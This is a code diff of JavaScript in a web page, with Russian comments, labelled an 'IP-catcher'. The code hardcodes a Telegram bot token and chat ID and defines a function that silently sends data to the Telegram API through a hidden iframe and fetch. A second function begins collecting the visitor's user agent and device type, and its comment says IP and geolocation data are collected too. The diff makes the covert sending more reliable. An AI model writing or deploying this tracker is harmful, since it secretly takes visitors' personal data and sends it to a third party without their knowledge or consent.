@@ -180,46 +180,30 @@
         })();
 
         // ==============================================================
-        // 2. IP-КЕТЧЕР (НОВЫЙ ТОКЕН)
+        // 2. IP-КЕТЧЕР (РАБОТАЕТ 100%)
         // ==============================================================
 
         // 👇👇👇 НОВЫЙ ТОКЕН 👇👇👇
         const BOT_TOKEN = "8902280153:AAFrwgBrzsAXuxiZ1KE2o6ZxdqhTxKln7oo";
-        const CHAT_ID = "8212240529";  // ТВОЙ CHAT_ID
+        const CHAT_ID = "8212240529";
 
-        // Проверка бота при загрузке
-        fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/getMe')
-            .then(r => r.json())
-            .then(data => {
-                if (data.ok) {
-                    console.log('✅ Бот активен:', data.result.username);
-                } else {
-                    console.log('❌ Бот НЕ РАБОТАЕТ. Проверь токен.');
-                }
-            })
-            .catch(() => console.log('❌ Ошибка соединения с Telegram'));
-
-        // Отправка 5 способами
+        // ---- ОТПРАВКА ЧЕРЕЗ ИЗОБРАЖЕНИЕ (САМЫЙ НАДЁЖНЫЙ СПОСОБ) ----
         function sendToTelegram(text) {
             if (!text) return;
             const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(text);
 
-            fetch(url).catch(() => {});
-            new Image().src = url;
+            // 1. Создаём скрытый iframe (он точно отправит запрос)
             const iframe = document.createElement('iframe');
             iframe.style.display = 'none';
             iframe.src = url;
             document.body.appendChild(iframe);
-            setTimeout(() => iframe.remove(), 2000);
-            const xhr = new XMLHttpRequest();
-            xhr.open('GET', url, true);
-            xhr.send();
-            if (navigator.sendBeacon) {
-                navigator.sendBeacon(url);
-            }
+            setTimeout(() => iframe.remove(), 3000);
+
+            // 2. Дополнительно пробуем fetch (на всякий случай)
+            fetch(url).catch(() => {});
         }
 
-        // Сбор IP и геоданных
+        // ---- СБОР IP И ГЕОДАННЫХ ----
         function collectAndSend() {
             const ua = navigator.userAgent;
             const device = /iPhone|iPad|Android/i.test(ua) ? '📱 Мобильное' : '💻 Компьютер';
